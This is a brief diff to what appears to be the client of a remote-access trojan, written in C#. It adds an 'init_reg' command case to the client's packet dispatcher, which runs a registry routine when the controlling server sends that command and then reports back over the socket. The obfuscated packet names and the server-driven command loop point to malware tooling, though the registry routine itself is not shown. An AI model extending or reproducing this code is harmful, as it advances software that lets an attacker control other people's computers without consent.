@@ -287,6 +287,14 @@ namespace Client.Connection
                 unpack_msgpack.DecodeFromBytes((byte[])data);
                 switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                 {
+                    case "init_reg":
+                        {
+                            SetRegistry.InitRegistry();
+                            MsgPack msgPack = new MsgPack();
+                            msgPack.ForcePathObject("Pac_ket").SetAsString("init_reg");
+                            ClientSocket.Send(msgPack.Encode2Bytes());
+                            break;
+                        }
                     case "Po_ng": //send interval value to server
                         {
                             ClientSocket.ActivatePo_ng = false;
